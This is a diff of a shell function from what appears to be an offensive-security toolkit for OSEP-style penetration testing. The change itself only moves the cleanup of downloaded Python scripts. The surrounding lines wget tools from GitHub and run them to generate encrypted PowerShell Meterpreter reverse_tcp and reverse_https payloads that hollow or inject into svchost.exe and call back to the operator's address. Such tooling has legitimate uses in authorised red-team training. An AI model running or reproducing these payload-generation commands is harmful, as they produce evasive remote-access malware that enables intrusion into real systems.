@@ -553,13 +553,11 @@ function oseppayloads(){
                 python powerhollow.py "$IPV4" "$TCP_PORT" "c:\windows\system32\svchost.exe" "explorer" "ps" -out "meterpreter_windows_x64_reverse_tcp_hollow_aes256_$IPV4-$TCP_PORT.ps1" -p "windows/x64/meterpreter/reverse_tcp"
                 echo "Command: python powerhollow.py $IPV4 $HTTPS_PORT 'c:\windows\system32\svchost.exe' 'explorer' 'ps' -out 'meterpreter_windows_x64_reverse_https_hollow_aes256_$IPV4-$HTTPS_PORT.ps1' -p 'windows/x64/meterpreter/reverse_tcp'"
                 python powerhollow.py "$IPV4" "$HTTPS_PORT" "c:\windows\system32\svchost.exe" "explorer" "ps" -out "meterpreter_windows_x64_reverse_https_hollow_aes256_$IPV4-$HTTPS_PORT.ps1" -p "windows/x64/meterpreter/reverse_https"
-                rm powerhollow.py
                 wget https://github.com/michiiii/OSEP-Tools/raw/main/powerinject.py
                 echo "Command: python powerinject.py -p windows/x64/meterpreter/reverse_https $IPV4 $HTTPS_PORT svchost M ps -out meterpreter_windows_x64_reverse_https_inject_aes256_$IPV4-$HTTPS_PORT.ps1"
                 python powerinject.py -p "windows/x64/meterpreter/reverse_https" "$IPV4" "$HTTPS_PORT" "svchost" "M" "ps" -out "meterpreter_windows_x64_reverse_https_inject_aes256_$IPV4-$HTTPS_PORT.ps1"
                 echo "Command: python powerinject.py -p windows/x64/meterpreter/reverse_tcp $IPV4 $HTTPS_PORT svchost M ps -out meterpreter_windows_x64_reverse_tcp_inject_aes256_$IPV4-$HTTPS_PORT.ps1"
                 python powerinject.py -p "windows/x64/meterpreter/reverse_tcp" "$IPV4" "$TCP_PORT" "svchost" "M" "ps" -out "meterpreter_windows_x64_reverse_tcp_inject_aes256_$IPV4-$TCP_PORT.ps1"
-                rm powerinject.py
 
                 echo "\n${YELLOW}${BOLD}==============${NC}"
                 echo "\n${YELLOW}${BOLD}LINUX PAYLOADS${NC}"
@@ -584,6 +582,7 @@ function oseppayloads(){
         else
                 echo -e "${RED}Please the interface and port you want to listen - msfgenpayloads msfgenpayloads <INTERFACE> <HTTPS_PORT_WIN> <TCP_PORT_WIN> <HTTPS_PORT_LINUX> <TCP_PORT_LINUX> <PAYLOAD PATH>${NC}"
         fi
+        rm $PAYLOAD_PATH/*.py
         cd $CURR_PWD
 }
 
